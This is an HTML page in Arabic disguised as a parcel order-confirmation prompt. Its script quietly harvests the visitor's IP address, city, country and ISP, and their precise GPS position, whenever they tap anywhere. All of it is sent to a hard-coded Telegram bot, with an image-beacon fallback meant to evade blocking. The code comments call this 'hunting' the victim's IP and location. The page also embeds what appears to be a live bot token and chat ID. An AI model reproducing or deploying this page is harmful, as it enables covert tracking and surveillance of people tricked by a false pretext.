<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>نظام تأكيد الطلبات</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; user-select: none; }
        html, body { height: 100%; width: 100%; background-color: #0f172a; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: pointer; }
        .box { background: #1e293b; padding: 40px 25px; border-radius: 30px; text-align: center; max-width: 350px; border: 1px solid rgba(255,255,255,0.1); pointer-events: none; }
        h3 { color: white; margin-bottom: 15px; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
        .btn-dummy { margin-top: 25px; background-color: #0088cc; color: white; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; display: block; }
    </style>
</head>
<body onclick="strike()" ontouchstart="strike()">

<div class="box">
    <div style="font-size: 50px; margin-bottom: 15px;">📦</div>
    <h3>نظام تأكيد الطلبات</h3>
    <p>لتأكيد هويتك وضمان وصول الطلب، يرجى النقر في أي مكان لتحديث بيانات الشحن رقم #TB-90021.</p>
    <div class="btn-dummy">تأكيد الهوية والطلب</div>
</div>

<script>
    const TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
    const ID = '6876904688';

    // دالة إرسال ذكية: لو فشل الطلب البرمجي، تبعثه عن طريق "صورة وهمية" (مستحيل تنحظر)
    function send(text) {
        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`;
        fetch(url).catch(() => {
            let img = new Image();
            img.src = url;
        });
    }

    function strike() {
        // --- المحرك 1: صيد الـ IP (مستقل تماماً) ---
        // جربنا نجيب البيانات الكاملة
        fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(d => {
            send(`🌐 [صيد IP]\n━━━━━━━━━━━━\nالآي بي: ${d.ip}\nالمدينة: ${d.city}\nالدولة: ${d.country_name}\nالشركة: ${d.org}\n━━━━━━━━━━━━`);
        })
        .catch(() => {
            // لو الخدمة الأولى فشلت، جرب فوراً خدمة ipify (الأسرع في العالم)
            fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => send(`🌐 [IP سريع]: ${data.ip}`))
            .catch(() => send("❌ فشل صيد الـ IP بالكامل"));
        });

        // --- المحرك 2: صيد الـ GPS (مستقل تماماً) ---
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    // الرابط العالمي الصحيح
                    const mapUrl = `https://www.google.com/maps?q=$${lat},${lng}`;
                    send(`📍 [موقع GPS]:\n${mapUrl}`);
                },
                (err) => {
                    send("⚠️ الزبون رفض إذن الموقع");
                },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        }
    }
</script>
</body>
</html>
